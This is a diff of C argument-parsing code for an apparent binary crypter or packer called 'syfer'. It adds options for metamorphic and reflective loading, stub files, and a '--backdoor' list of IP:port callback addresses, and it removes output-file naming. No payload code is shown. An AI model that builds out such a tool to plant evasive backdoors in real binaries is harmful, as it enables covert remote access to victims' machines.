@@ -41,7 +41,6 @@ syfer_verbose( t__sy_binary *data ) {
 	        fprintf( stderr, "\t\t%s %s %s\n", ANSI_COLOR_YELLOW, data->stub[i], ANSI_COLOR_RESET);
 
     }
-	fprintf( stderr, "\t%sOutput: %s%s\n", ANSI_COLOR_YELLOW, data->out_binary_name, ANSI_COLOR_RESET);
 }
 
 static void
@@ -64,7 +63,96 @@ get_numbers_of_parameters( int ac, char **av, int i, const char *model ) {
         ++i;
     }
     return ( nb );
-)
+}
+
+static int
+_sy_parameter_backdoor( int ac, char **av, int *i, t__sy_binary *data )
+{
+	uint8_t	num = 0x00;
+
+    regex_t regex;
+	if ( regcomp(&regex,
+			"^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))."
+			"([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))."
+			"([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))."
+			"([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5])):([0-9]{1,5})$", REG_EXTENDED)  )
+	{
+			fprintf(stderr, "%s[-] Could not compile regex%s\n", ANSI_COLOR_RED, ANSI_COLOR_RESET);
+			exit( EXIT_FAILURE );
+	}
+
+    uint32_t nb = get_numbers_of_parameters( ac, av, *i, "--end-backdoor" );
+    if ( nb == 0x00 ) {
+        regfree( &regex );
+        return ( 0x01 );
+    }
+
+    data->ip = calloc( sizeof(char *), nb+1);
+    if ( data->ip == NULL ) {
+        regfree( &regex );
+        return fprintf(stderr, "%s[-] An memory allocation error has occurred. LINE: %d FILE: %s Errno: %s %s\n", ANSI_COLOR_RED, __LINE__, __FILE__, strerror(errno), ANSI_COLOR_RESET);
+    }
+
+    for( int j = 0x00; *i < ac && strcmp( av[*i], "--end-backdoor") != 0x00; ++(*i) )
+    {
+        if ( regexec( &regex, av[*i], 0, NULL, 0 ) != REG_NOMATCH )
+            data->ip[ j++ ] = av[*i];
+    }
+    regfree( &regex );
+    if ( ! data->ip[0] )
+        return ( 1 );
+    return ( 0x00 );
+}
+
+static int
+_sy_parameter_stub( int ac, char **av, int *i, t__sy_binary *data )
+{
+    uint32_t nb = get_numbers_of_parameters( ac, av, *i, "--end-stub" );
+    if ( nb == 0X00 )
+        return ( 0X01 );
+
+    data->stub = calloc( sizeof(char **), nb+1);
+    if ( data->stub == NULL )
+        return fprintf(stderr, "%s[-] An memory allocation error has occurred. LINE: %d FILE: %s Errno: %s %s\n", ANSI_COLOR_RED, __LINE__, __FILE__, strerror(errno), ANSI_COLOR_RESET);
+
+    for( int j = 0x00; *i < ac && strcmp( av[*i], "--end-stub") != 0x00; ++(*i) )
+    {
+		__sy_stat	info = {0};
+		if ( lstat( av[*i], &info ) == -1 ) {
+            fprintf( stderr, "%s[-] %s: %s %s\n", ANSI_COLOR_RED, av[*i], strerror(errno), ANSI_COLOR_RESET);
+            continue;
+        }
+        if ( access( av[*i], R_OK ) != 0x00 ) {
+            fprintf( stderr, "%s[-] %s: %s %s\n", ANSI_COLOR_RED, av[*i], strerror(errno), ANSI_COLOR_RESET);
+            continue;
+        }
+        if ( info.st_size == 0X00 ) {
+            fprintf( stderr, "%s[-] %s: The file is empty.%s\n", ANSI_COLOR_RED, av[*i], ANSI_COLOR_RESET);
+            continue;
+        }
+
+        data->stub[ j++ ] = av[ *i ];
+    }
+    if ( data->stub[ 0X00 ] == NULL )
+        return ( 0X01 );
+    return 0X00;
+}
+
+void
+do_analyze_parameter( int ac, char **av, int *i, t__sy_binary *data )
+{
+    int ret;
+
+    for ( ; *i < ac; (*i)++ ) {
+		if ( ! strcmp( av[*i], "--metamorph") )
+			data->opts |= 0X01;
+		else if ( ! strcmp( av[*i], "--compress") )
+			data->opts |= 0X02;
+		else if ( ! strcmp( av[*i], "--reflective"))
+			data->opts |= 0X08;
+		else if ( ! strcmp( av[*i], "--load-binary-user-space") )
+			data->opts |= 0X10;
+		else if ( ! strcmp( av[*i], "--stub"))
 		{
             ++(*i);
             ret = _sy_parameter_stub( ac, av, i, data );
@@ -84,10 +172,6 @@ get_numbers_of_parameters( int ac, char **av, int i, const char *model ) {
                 data->opts |= 0X20;
 
         }
-        else if ( ! strcmp( av[*i], "-o")) {
-            memcpy( data->out_binary_name, av[*i+1], strlen( av[*i+1]));
-            ++(*i);
-        }
         else
         {
             --(*i);
@@ -98,7 +182,7 @@ get_numbers_of_parameters( int ac, char **av, int i, const char *model ) {
 
 
 int
-analyze_parameter( int ac, char **av )
+analyze_parameter( int __attribute__((unused)) ac, char __attribute__((unused))**av )
 {
 	t__sy_binary	*data = calloc( sizeof( char), sizeof( t__sy_binary));
 	if ( data == NULL )
@@ -113,20 +197,11 @@ analyze_parameter( int ac, char **av )
         {
             data->binary_name = av[i++];
 		    do_analyze_parameter(ac, av, &i, data);
-
-            if ( *data->out_binary_name == 0x00 ) {
-                char    *tmp = strrchr( data->binary_name, '/');
-                if ( tmp == NULL )
-                    tmp = data->out_binary_name;
-                sprintf( data->out_binary_name, "Syfer_%s.out", ++tmp);
-            }
-
             syfer_verbose( data );
 
             ( data->stub != NULL ) ? free( data->stub ) : 0X00;
             ( data->ip != NULL ) ? free( data->ip ) : 0X00;
             memset( data, 0X00, sizeof( t__sy_binary));
-            printf("\n");
         }
 	}
     free( data );
